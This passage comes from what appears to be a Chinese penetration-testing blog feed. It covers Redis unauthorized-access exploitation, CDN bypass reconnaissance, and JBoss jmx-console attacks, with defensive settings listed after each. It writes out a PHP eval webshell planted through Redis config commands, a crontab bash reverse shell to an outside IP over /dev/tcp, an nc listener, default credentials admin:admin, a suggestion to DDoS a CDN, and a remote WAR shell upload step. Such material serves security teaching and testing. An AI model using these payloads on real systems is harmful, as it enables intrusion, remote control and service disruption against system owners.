<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">config set dir /home</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">set webshell &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span><br><span class="line">set webshell &quot;\r\n\r\n&lt;?php eval($_POST[admin]);?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>



<h3 id="利用crontab反弹shell"><a href="#利用crontab反弹shell" class="headerlink" title="利用crontab反弹shell"></a>利用crontab反弹shell</h3><p>利用条件：</p>
<ul>
<li>具有写入权限</li>
<li>只能在centos上使用</li>
</ul>
<p>Ubuntu权限必须是600才会执行，而redis写文件的权限是644</p>
<p>redis保存RDB会存在乱码，在Ubuntu上会报错</p>
<p>端口监听</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>

<p>连接redis，写入shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-cli -h 127.0.0.1 -p 6379</span><br><span class="line">config set dir</span><br><span class="line">config set dir /var/spool/cron</span><br><span class="line"><span class="meta">#</span><span class="bash"> config <span class="built_in">set</span> dir /var/spool/cron/crontabs</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> config <span class="built_in">set</span> dir /etc/</span></span><br><span class="line">config set dbfilename shellcrontab</span><br><span class="line">set shell &quot;\n\n/* * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.1.1/8888 0&gt;&amp;1\n\n&quot;</span><br><span class="line">save</span><br><span class="line"><span class="meta">#</span><span class="bash"> 星号代表每分钟执行一次</span></span><br></pre></td></tr></table></figure>



<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li>禁止外部网络访问Redis服务端</li>
<li>禁止使用root权限启动Redis服务</li>
<li>配置安全策略，限制连接Redis服务的IP</li>
<li>修改redis.conf文件，禁止高危命令或者改变高危命令的名称</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG &quot;&quot;</span><br><span class="line">rename-command EVAL &quot;&quot;</span><br><span class="line"></span><br><span class="line">rename-command FLUSHALL &quot;name1&quot;</span><br><span class="line">rename-command CONFIG &quot;name2&quot;</span><br><span class="line">rename-command EVAL &quot;name3&quot;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>服务器应用漏洞</category>
        <category>常规漏洞</category>
        <category>Redis数据库</category>
        <category>未授权访问漏洞</category>
      </categories>
      <tags>
        <tag>未授权访问</tag>
      </tags>
  </entry>
  <entry>
    <title>信息搜集-绕过CDN查找真实IP</title>
    <url>//6a3a4fb37fd1.html</url>
    <content><![CDATA[<h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p>​        在渗透测试过程中，经常会碰到网站有CDN的情况。CDN即内容分发网络，主要解决因传输距离和不同运营商节点造成的网络速度性能低下的问题。说的简单点，就是一组在不同运营商之间的对接点上的高速缓存服务器，把用户经常访问的静态数据资源直接缓存到节点服务器上，当用户再次请求时，会直接分发到离用户近的节点服务器上响应给用户，当用户有实际数据交互时才会从远程Web服务器上响应，这样可以大大提高网站的响应速度及用户体验。</p>
<h2 id="CDN的优势"><a href="#CDN的优势" class="headerlink" title="CDN的优势"></a>CDN的优势</h2><ul>
<li>提高用户访问频率，优化用户使用体验</li>
<li>隐藏真实服务器IP</li>
<li>提供WAF功能</li>
</ul>
<h2 id="访问方式"><a href="#访问方式" class="headerlink" title="访问方式"></a>访问方式</h2><ul>
<li>传统访问：用户访问域名——解析服务器IP——访问目标主机</li>
<li>普通CDN：用户访问域名——CDN节点——真实服务器IP——访问目标主机</li>
<li>带WAF的CDN：用户访问域名——CDN节点（云WAF）——真实服务器IP——访问目标主机</li>
</ul>
<h2 id="如何判断CDN"><a href="#如何判断CDN" class="headerlink" title="如何判断CDN"></a>如何判断CDN</h2><p>使用不同地方的ping服务，查看域名的对应IP地址是否唯一</p>
<p>如果不唯一就有可能使用了CDN</p>
<p>ping测试的网站</p>
<ul>
<li><a href="https://wepcc.com/">https://wepcc.com/</a></li>
<li><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></li>
<li><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a></li>
</ul>
<h2 id="验证IP是否为域名真实IP"><a href="#验证IP是否为域名真实IP" class="headerlink" title="验证IP是否为域名真实IP"></a>验证IP是否为域名真实IP</h2><p>修改本地hosts文件，将域名和IP解析对应</p>
<p>如何访问域名查看页面变化</p>
<h2 id="绕过CDN查找真实IP"><a href="#绕过CDN查找真实IP" class="headerlink" title="绕过CDN查找真实IP"></a>绕过CDN查找真实IP</h2><h3 id="1-查找子域名"><a href="#1-查找子域名" class="headerlink" title="1. 查找子域名"></a>1. 查找子域名</h3><p>当一个网站存在大量业务，使用了很多子站点，可能只对主站或者流量大的子站使用了CDN</p>
<p>而一些小的子站点和主站在一个服务器或者一个网段内</p>
<p>此时就可以查询子域名对应的IP来辅助查找真实IP</p>
<p>使用到的网站以及工具，建议多个工具配置使用</p>
<ul>
<li>在线子域名查询：<a href="https://phpinfo.me/domain">https://phpinfo.me/domain</a></li>
<li>微步在线：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li>
<li>DNSDB：<a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a></li>
<li>Layer 子域名挖掘机</li>
<li>subDomainBrute：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></li>
<li>OneForAll：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></li>
<li>Sublist3r：<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></li>
</ul>
<h3 id="2-查找顶级域名"><a href="#2-查找顶级域名" class="headerlink" title="2. 查找顶级域名"></a>2. 查找顶级域名</h3><p>为了方便，大多数网站只对www域名使用CDN，为的是维护网站更加方便，不用等待CDN缓存。</p>
<p>把www去掉，ping以下主域名，看一看IP有没有变化</p>
<h3 id="3-邮件服务器"><a href="#3-邮件服务器" class="headerlink" title="3. 邮件服务器"></a>3. 邮件服务器</h3><p>一般邮件系统在内部，不经过CDN的解析，通过网站内用户注册，评论，订阅等功能，查看邮件</p>
<p>寻找邮件头中的域名IP（第三方或者公共的邮件服务无效）</p>
<h3 id="查看域名历史解析记录"><a href="#查看域名历史解析记录" class="headerlink" title="查看域名历史解析记录"></a>查看域名历史解析记录</h3><p>若网站很久之前没有使用过CDN，所以可能存在使用CDN之前的记录</p>
<p>通过以下网站查询域名的历史解析记录</p>
<ul>
<li><p>在线域名解析记录：<a href="http://www.jsons.cn/nslookup/">http://www.jsons.cn/nslookup/</a></p>
</li>
<li><p>微步在线：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p>
</li>
<li><p>DNSDB：<a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a></p>
</li>
<li><p>全球CDN查询：<a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p>
</li>
<li><p>Viewdns：<a href="https://viewdns.info/">https://viewdns.info/</a></p>
</li>
</ul>
<h3 id="国外访问"><a href="#国外访问" class="headerlink" title="国外访问"></a>国外访问</h3><p>国内的CDN往往只对国内用户的访问加速，而国外的CDN就不一定了</p>
<p>因此通过国外代理访问网站，可能会得到真实的IP地址</p>
<h3 id="Nslookup-查询"><a href="#Nslookup-查询" class="headerlink" title="Nslookup 查询"></a>Nslookup 查询</h3><p>查询域名的NS记录、MX记录、TXT记录等很有可能指向的是真实ip或同C段服务器</p>
<p><a href="http://www.jsons.cn/nslookup/">http://www.jsons.cn/nslookup/</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup baiker.top</span><br><span class="line">nslookup -qt=txt baiker.top</span><br><span class="line">nslookup -qt=cname baiker.top</span><br><span class="line">nslookup -qt=txt baiker.top</span><br><span class="line">nslookup -qt=MX baiker.top</span><br></pre></td></tr></table></figure>



<h3 id="网站漏洞"><a href="#网站漏洞" class="headerlink" title="网站漏洞"></a>网站漏洞</h3><p>利用网站自身存在的漏洞，很多情况下会泄露自身服务器的真实IP</p>
<h3 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h3><p>利用搜索引擎获取IP地址</p>
<p>常见的比如Censys，sofa，zoomeye，shodan</p>
<h3 id="利用SSL证书"><a href="#利用SSL证书" class="headerlink" title="利用SSL证书"></a>利用SSL证书</h3><p>证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中，SSL/TLS证书通常包含域名、子域名和电子邮件地址。因此SSL/TLS证书成为了攻击者的切入点</p>
<ul>
<li><a href="https://crt.sh/">https://crt.sh/</a></li>
<li><a href="https://censys.io/ipv4?q=github.com">https://censys.io/ipv4?q=github.com</a></li>
</ul>
<h3 id="DOS攻击"><a href="#DOS攻击" class="headerlink" title="DOS攻击"></a>DOS攻击</h3><p>DDOS耗尽CDN的流量，这样就能得到真实IP</p>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss Administration Console弱口令</title>
    <url>//da2c39cb4a8f.html</url>
    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>默认端口：8080</p>
<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​    此漏洞主要是由于JBoss中<code>/jmx-console/HtmlAdaptor</code>路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到jmx控制台，并在其中执行任何功能。</p>
<p>由于 JBoss Web Server 缺少默认身份验证强制执行，因此也可以完全控制应用程序。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：</p>
<p>全版本</p>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 6</p>
<p>在官网下载相应的JBoss版本</p>
<p>配置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>

<p>外网访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
<ol>
<li>JBoss漏洞检测工具下载</li>
</ol>
<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
<ol start="2">
<li>先探测是否具有JBoss服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>

<p>根据HTTP头部</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>



<p>访问如下URL</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/jmx-console/HtmlAdaptor</span><br></pre></td></tr></table></figure>

<p>该页面存在默认口令<code>admin:admin</code></p>
<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li>将JBoss后台添加权限，控制访问者对敏感路径访问</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\jboss-web.xml</span><br><span class="line">＃　删除下列代码的注释,添加账号密码访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-domain</span>&gt;</span>java:/jaas/jmx-console<span class="tag">&lt;/<span class="name">security-domain</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\web.xml</span><br><span class="line">＃　删除下列代码的注释，只有拥有系统配置的登录角色JBossAdmin的用户才能访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">web-resource-name</span>&gt;</span>HtmlAdaptor<span class="tag">&lt;/<span class="name">web-resource-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>An example security config that only allows users with the role JBossAdmin to access the HTML JMX console web application</span><br><span class="line">		<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>GET<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>POST<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">role-name</span>&gt;</span>JBossAdmin<span class="tag">&lt;/<span class="name">role-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># 这里修改账号密码</span><br><span class="line">jboss\server\default\conf\props\jmx-console-users.properties</span><br><span class="line">#　这里修改账号权限</span><br><span class="line">jboss\server\default\conf\props\jmx-console-roles.properties</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>若不使用控制平台管理，删除<code>jmx-console.war</code>和<code>web-console.war</code>，在以下路径</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jboss\server\all\deploy\jmx-console.war</span><br><span class="line">jboss\server\default\deploy\jmx-console.war</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>JBoss</category>
      </categories>
      <tags>
        <tag>访问控制错误漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss DeploymentFileRepository目录遍历漏洞 - CVE-2006-5750</title>
    <url>//238965db204a.html</url>
    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>默认端口：8080</p>
<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>JBoss 应用服务器 (jbossas) 3.2.4 到 4.0.5 中 <code>DeploymentFileRepository</code> 类中的目录遍历漏洞允许远程认证用户通过与控制台管理器相关的未指定向量读取或修改任意文件，并可能执行任意代码。</p>
<p><code>org.jboss.console.manager.DeploymentFileRepository</code> 类的 <code>setBaseDir()</code> 方法不检查是否通过目录遍历将 <code>basedir</code> 设置为应用程序根目录之外的目录。结合<br>使用 <code>store()</code> 和 <code>remove()</code> 方法，可以<br>在目标系统上创建和删除任意文件。</p>
<p>该类由 JBoss Web 服务器的 <code>web-console/jmx-console</code>使用，默认情况下，未经身份验证的<br>用户可以从远程访问它。在我们的研究过程中，可以创建和执行 JSP 文件并覆盖配置文件。</p>
<p>该类也可能被其他 JBoss 应用程序使用，从而使它们容易受到相同的攻击。</p>
<p>由于 JBoss Web Server 缺少默认身份验证强制执行，因此也可以完全控制应用程序。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：</p>
<p>JBoss 3.2.5 ~ 4.0.5</p>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 6</p>
<p>在官网下载相应的JBoss版本</p>
<p>配置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>

<p>外网访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
<ol>
<li>JBoss漏洞检测工具下载</li>
</ol>
<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
<ol start="2">
<li>先探测是否具有JBoss服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>

<p>根据HTTP头部</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>



<p><strong>访问如下URL</strong></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.admin:service=DeploymentFileRepository</span><br></pre></td></tr></table></figure>

<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gu37mkia7wj60qa083dko02.jpg" alt="JBoss DeploymentFileRepository目录遍历漏洞.png"></p>
<p>这里<code>BaseDir</code>没有对输入的路径做检查</p>
<p>我们可以设置任意路径</p>
<p>并且通过该类下的<code>store()</code>和<code>remove()</code>方法创建和删除文件</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gu37wd5476j60lh0im10302.jpg" alt="JBoss DeploymentFileRepository目录遍历漏洞1.png"></p>
<p>可以通过此方法创建或者覆盖<code>jsp</code>后端语言的文件并执行</p>
<p>可以获取目标系统<code>getshell</code>或者执行任意代码</p>
<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li>将JBoss后台添加权限，控制访问者对敏感路径访问</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\jboss-web.xml</span><br><span class="line">＃　删除下列代码的注释,添加账号密码访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-domain</span>&gt;</span>java:/jaas/jmx-console<span class="tag">&lt;/<span class="name">security-domain</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\web.xml</span><br><span class="line">＃　删除下列代码的注释，只有拥有系统配置的登录角色JBossAdmin的用户才能访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">web-resource-name</span>&gt;</span>HtmlAdaptor<span class="tag">&lt;/<span class="name">web-resource-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>An example security config that only allows users with the role JBossAdmin to access the HTML JMX console web application</span><br><span class="line">		<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>GET<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>POST<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">role-name</span>&gt;</span>JBossAdmin<span class="tag">&lt;/<span class="name">role-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># 这里修改账号密码</span><br><span class="line">jboss\server\default\conf\props\jmx-console-users.properties</span><br><span class="line">#　这里修改账号权限</span><br><span class="line">jboss\server\default\conf\props\jmx-console-roles.properties</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>更新到 JBoss 5.1.0 或者6.0.0以上</li>
<li>若不使用控制平台管理，删除<code>jmx-console.war</code>和<code>web-console.war</code>，在以下路径</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jboss\server\all\deploy\jmx-console.war</span><br><span class="line">jboss\server\default\deploy\jmx-console.war</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>常规漏洞</category>
        <category>JBoss</category>
        <category>目录遍历漏洞</category>
      </categories>
      <tags>
        <tag>目录遍历漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss DeploymentScanner.addURL()文件上传漏洞</title>
    <url>//3f4628f47a28.html</url>
    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>默认端口：8080</p>
<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​        此漏洞主要是由于JBoss中<code>/jmx-console/HtmlAdaptor</code>路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到jmx控制台，并在其中执行任何功能。该漏洞利用的是后台中<code>jboss.deployment -&gt; DeploymentScanner -&gt; addURL()</code>方法，传入带有war包的HTTP地址，当服务器访问时便会上传shell。</p>
<p>但是，上传shell的文件只是一个映射文件，</p>
<p>当url一旦无法访问或者内部资源丢失，则服务器上的文件也会相应消失。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：JBoss 4.x以下</p>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 8以下</p>
<p>在官网下载相应的JBoss版本</p>
<p>配置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>

<p>外网访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
<ol>
<li>JBoss漏洞检测工具下载</li>
</ol>
<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
<ol start="2">
<li>先探测是否具有JBoss服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>

<p>根据HTTP头部</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>



<p><strong>访问如下URL</strong></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.deployment:type=DeploymentScanner,flavor=URL</span><br></pre></td></tr></table></figure>

<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gu2c37ac55j60og07ejt802.jpg" alt="JBoss文件上传addURL().png"></p>
<p>输入带有war包的HTTP地址</p>
<p><code>http://xxx.com/shell.war</code></p>
<p>最后点击<code>Invoke</code>上传</p>
<p>上传的路径为<code>JBos/server/default/deploy/management/shell.war/shell.jsp</code></p>
<p>访问以下URL链接shell</p>
<p><code>http://127.0.0.1:8080/shell/shell.jsp</code></p>
<p><strong>制作WAR包</strong></p>
